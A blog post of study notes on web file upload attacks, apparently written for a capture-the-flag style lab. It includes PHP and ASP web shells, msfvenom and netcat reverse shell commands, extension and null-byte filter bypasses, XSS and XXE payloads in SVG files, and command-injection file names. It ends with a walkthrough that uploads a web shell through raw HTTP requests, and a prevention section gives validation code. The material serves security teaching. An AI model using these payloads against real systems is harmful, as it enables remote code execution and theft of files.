---
layout: post
title: File Upload Attacks
date: 2024-03-05 11:47 +0000
---

File Upload vulnerabilities appear on web app functionalities that allow users to upload files.
If they are not validated, this files can allow execution of commands. In order to execute commands on the operative system we need to upload web shells or reverse shells that run the same technology of the web app.

Because of that, we need to find what is the programming language used in the web app. Additionally we need to find te place where the uploaded files are stored.
Steps:
    - Find programming language
    - Create a web shell or reverse shell
    - Bypass Filters
    - Find where the file is stored
    - Interact with the file

## Step 1: Find programming Language

We can fuzzing to find what is the extension allowed: `ffuf -w ~/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ  -u http://94.237.54.75:34177/index.FUZZ`
However in some web apps that use `Web Routing` it is more difficult since they associate endpoints with pages.
We can use the extension `wappalizer` to get more info too.

## Step 2: Create a web shell or reverse shell

### Web Shells

For web shells there is a tool called [phpbash](https://github.com/Arrexel/phpbash) that provides a terminal web shell semi-interactive.
Additionally we have `Seclists` that contain web shells in `SecLists/Web-Shells/`. 
But we can write our own web shells once we found the programming language used in the website. Bellow are some examples:
    - PHP: `<?php $cmd=$_GET['cmd']; echo system($cmd); ?>`
    - ASP: `<% eval request('cmd') %>`

### Reverse Shells

Sometimes web shells may not work so we need to use reverse shells. A common reverse shell for php is [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell) which provides a rev shell `php-reverse-shell.php`. We just need to add our `IP` and `PORT` and start a `netcat` listener : `nc -lvnp <PORT>`.

### Generating Custom Reverse Shell Scripts

Sometimes functions like `system` may not be accessible and we need to use core framework functions.
For that we can use `msfvenom` to build a rev shell: `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`

## Step 3: Bypass Filters

### Client-side Validation

If the validation is only in the client side then we have full control over it.
We can bypass it using two techniques:
    - Using a web proxy like Burpsuite: Capture the request and change the name of the file and the content.
    - Change the frontend code in the browser: In the majority of the times its javascript and we can disable the functions that are filtering the input.

### Blacklist Filters

- There are two types: whitelist extensions and blacklist extensions
- The worst type is the blacklisted extensions because we can run code with different extensions.
- In windows servers file names are case-insensitive which means `pHp` can be used to bypass a list containing `php`
- We can fuzz the extensions with ffuf: `ffuf -w ~/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ  -request request.txt -request-proto http`

### Whitelist Filters

- If the whitelist filtering uses regex we can use double extensions to try to bypass, example `shell.jpg.php`.
- Even if the whitelist filters for only one extension `/^.*\.(jpg|jpeg|png|gif)$/` the web server may be misconfigured leading to a reverse double extension
- An example can be the config bellow. This configuration allow us to execute php code even if we pass `shell.php.jpg`.

```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

- A php wordlist that we can use to test can be found [here](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)
- `Character injection` is another technique that can be used to bypass whitelist
- We can inject the following characters: `%20, %0a, %00m, %0d0a, /, .\\, ., …, :` in order to write the file to the filesystem and pass the whitelist validation.
- For example `shell.php%00.jpg` works with PHP servers with version 5.X or earlier, as it causes the PHP web server to end the file name after the (%00), and store it as (shell.php), while still passing the whitelist
- The same may be used with web applications hosted on a Windows server by injecting a colon (:) before the allowed file extension (e.g. shell.aspx:.jpg), which should also write the file as (shell.aspx)
- Script to generate a list using the character injection:

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    while read ext; do
    #for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done < php_extensions.txt
done
```

    
### Type filters

The methods to validate the file content can be split in two: **Content-Type Header** and **File Content**.
We can fuzz the content-type header with the list `~/SecLists/Miscellaneous/web/content-type.txt`, to lower the number of entries for an image file upload we can execute the following command: `cat ~/SecLists/Miscellaneous/web/content-type.txt | grep 'image/' > image-content-types.txt`
Once we get a successful response we known found a valid content-type. 
We can send a `shell.php` with a content-type `image/jpg`

The second file content validation is using the MIME-type. This is usually done by inspecting the first few bytes which contain the [File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures) or [Magic Bytes](https://opensource.apple.com/source/file/file-23/file/magic/magic.mime).
Since some image types have non-printable bytes we can always use `GIF8` to imitate a GIF image.
Example:

```
POST /upload.php HTTP/1.1
...
GIF8
<?php echo "Hello Worth" ?>
```

`ffuf -w ~/SecLists/wordlist.txt:FUZZ -w ~/SecLists/Miscellaneous/web/content-type.txt:FUZZ2 -request ~/request_image_type -request-proto http -ms 26`


## Limited File Uploads

- If the web app shows image metadata we can insert XSS in the comments of the image and upload it. This will introduce a stored xss vuln into the web app.
- We can do this with exiftool: `exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg`
- The same way, we can introduce a XSS vuln into a SBG image by adding it as follows:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

- Another similar attack is XXE. In SVG images we can add the following to read `/etc/passwd`: 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

- Using this technique we can read the source code and extract the following info:
    - locate the upload directory
    - identify allowed extensions
    - find the file naming scheme

- To extract source code use base64:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

- Finally, the file upload vulnerability may lead to denial of service using the following techniques:
    - Decompression Bomb, if the web app automatically unzips a ZIP archive.
    - Pixel Flood, which creates a huge picture that when displayed will crash the server.

## Other Upload Attacks

### Injections in File Name

Some examples:
- `file$(whoami).jpg`
- ```file`whoami`.jpg```
- `file.jpg||whoami`
- Use XSS in file name: `<script>alert(window.origin);</script>`
- Use SQL query in file name: `file';select+sleep(5);--.jpg`

### Windows Specific Attacks

When dealing with the Windows environment we can use reserved characters (|, <, >, *, or ?) or reserved names(CON, COM1, LPT1, or NUL).
In older versions to shorten the file name Windows used `~`, for example, `HAC~1.txt` can match files with `HAC`. We can use this technique to overwrite files such as web.conf with `WEB~.conf`.

## Prevention

- Use blacklist(if the extension exists anywhere within the file name) and whitelist(if the file name ends with the extension) filtering:

```php
$fileName = basename($_FILES["uploadFile"]["name"]);

// blacklist test
if (preg_match('/^.+\.ph(p|ps|ar|tml)/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// whitelist test
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

- We should validate if the file extension matches the file content and the content-type.

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// whitelist test
if (!preg_match('/^.*\.png$/', $fileName)) {
    echo "Only PNG images are allowed";
    die();
}

// content test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!in_array($type, array('image/png'))) {
        echo "Only SVG images are allowed";
        die();
    }
}
```

- We should try to avoid the upload directory. Instead we should develop a download page or endpoint that can be used to download the file.
- Additionally we should never uncover the actual file name and should generate random names and map them to the users.
- Users do not have direct access to the uploads directory.
- Another thing we can do is store the uploaded files in a separate server or container.
- Another thing we should do is to disable showing any system or server errors, to avoid sensitive information disclosure. 
- We should always handle errors at the web application level and print out simple errors that explain the error without disclosing any sensitive or specific details, like the file name, uploads directory, or the raw errors.

Other considerations:
- Limit file size
- Update any used libraries
- Scan uploaded files for malware or malicious strings
- Utilize a Web Application Firewall (WAF) as a secondary layer of protection


## Final CHallenge

### Step 1: Find vulnerable request

In the contact form we have image preview that when captured with burpsuite we see that a POST request is sent to `/contact/upload.php`.
Changing the file extension to php we notice a filter error `extension not allowed`, we are in the right path.

## Step 2: Bypass the filters

After a couple attempts we are able to use `.phar%00.jpeg` without any errors.
We can't use `GIF8` as the file signature but we can use the jpeg one `ÿØÿÛ`.
However, we dont know where they store the files so we need to read `upload.php` in order to find the uploads path.
Using the following request we get the `upload.php` and the upload directory `/contact/user_feedback_submissions`.

```
POST /contact/upload.php HTTP/1.1
Host: 83.136.253.251:34678
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://83.136.253.251:34678/contact/
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------10019983334881342564128806157
Content-Length: 387
Origin: http://83.136.253.251:34678
DNT: 1
Connection: close

-----------------------------10019983334881342564128806157
Content-Disposition: form-data; name="uploadFile"; filename="w0rth.phar%00.jpeg"
Content-Type: image/png

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
-----------------------------10019983334881342564128806157--

```

```php
$target_dir = "./user_feedback_submissions/";

// rename before storing
$fileName = date('ymd') . '_' . basename($_FILES["uploadFile"]["name"]);
$target_file = $target_dir . $fileName;

// get content headers
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// blacklist test
if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
    echo "Extension not allowed";
    die();
}

// whitelist test
if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// type test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
        echo "Only images are allowed";
        die();
    }
}

// size test
if ($_FILES["uploadFile"]["size"] > 500000) {
    echo "File too large";
    die();
}

if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
    displayHTMLImage($target_file);
} else {
    echo "File failed to upload";
}

```

The web app stores the files in: `/contact/user_feedback_submissions/240306_w0rth.jpeg` like that where 240306 is 6/3/2024.
Once we found the upload directory we need to upload a web shell in order to find the flag.
FOr the php to be executed I tried the special characters but only `:` worked.
The final request to sen a web shell is :

```bash
POST /contact/upload.php HTTP/1.1
Host: 94.237.55.163:57406
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://94.237.55.163:57406/contact/
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------192607832834482457191500253365
Content-Length: 285
Origin: http://94.237.55.163:57406
DNT: 1
Connection: close

-----------------------------192607832834482457191500253365
Content-Disposition: form-data; name="uploadFile"; filename="w0rth.phar:.jpeg"
Content-Type: image/jpeg

ÿØÿÛ  <?php echo system($_GET["cmd"]) ?>
-----------------------------192607832834482457191500253365--
```

To access the web shell go to : `http://94.237.55.163:57406/contact/user_feedback_submissions/240307_w0rth.phar:.jpeg?cmd=ls`